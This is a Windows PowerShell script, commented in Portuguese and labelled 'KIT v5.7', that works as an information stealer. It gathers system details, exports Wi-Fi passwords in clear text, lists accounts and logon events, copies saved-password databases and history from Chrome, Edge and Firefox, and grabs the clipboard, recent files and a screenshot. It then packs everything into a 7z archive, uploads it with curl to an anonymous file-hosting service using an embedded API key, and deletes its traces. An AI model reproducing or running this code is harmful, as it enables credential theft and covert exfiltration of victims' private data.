# ---------- KIT v5.7 – 7Z, sem corrupção, upload GARANTIDO ----------
$ErrorActionPreference = "Stop"
$kit     = "$env:TEMP\kit"
$key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$upUrl   = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
$logFile = "$env:TEMP\kit_log.txt"
$7z      = "$env:TEMP\7za.exe"   # 7-Zip stand-alone 1 MB

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Tee-Object -FilePath $logFile -Append
}

# 0) Baixa 7za.exe se não existir
if (!(Test-Path $7z)) {
    Write-Log "[7Z] Baixando 7za.exe..."
    Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
    Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

Write-Log "[START] KIT iniciado em $env:COMPUTERNAME\$env:USERNAME"
New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1..8) Coleta igual ao v5.6 (mesmo bloco)
Write-Log "[INFO] Coletando sistema e hardware..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

Write-Log "[INFO] Exportando perfis Wi-Fi..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

Write-Log "[INFO] Listando usuários e admins..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
if ($secLog -and $secLog.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
        Select TimeCreated,Id,LevelDisplayName,Message |
        Out-File "$kit\logons.txt" -Encoding UTF8
} else {
    "Log Security não disponível" | Out-File "$kit\logons.txt" -Encoding UTF8
}

Write-Log "[INFO] Copiando dados de navegadores..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }

Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter | Out-File "$kit\mycerts.txt" -Encoding UTF8
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue | Select Name,LastWriteTime | Out-File "$kit\recent.txt" -Encoding UTF8

Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
[System.GC]::Collect(); Start-Sleep -Milliseconds 200

# 9) Compactação 7Z – LZMA2, sólido, ultra
Write-Log "[7Z] Compactando pacote..."
$arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
& $7z a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mmt=on -bsp0 -y $arc "$kit\*" | Out-Null
Write-Log "[7Z] Criado: $arc ($(Get-Item $arc).Length bytes)"

# 10) Upload – agora como application/x-7z-compressed
Write-Log "[UP] Enviando para AnonFiles..."
try {
    $cmdLine = 'curl.exe -s -X POST -H "Content-Type: multipart/form-data" -F "file=@' + $arc + ';type=application/x-7z-compressed" ' + $upUrl
    $reply = cmd /c $cmdLine
    Write-Log "[UP] Resposta bruta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "[OK] Upload finalizado – link: $($matches[1])"
    } else {
        Write-Log "[ERRO] Falha ao obter URL pública"
    }
} catch {
    Write-Log "[ERRO] Exceção no upload: $_"
}

# 11) Limpeza
Write-Log "[CLEAN] Removendo pasta temporária..."
Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
Write-Log "[END] KIT finalizado. Log completo em $logFile"
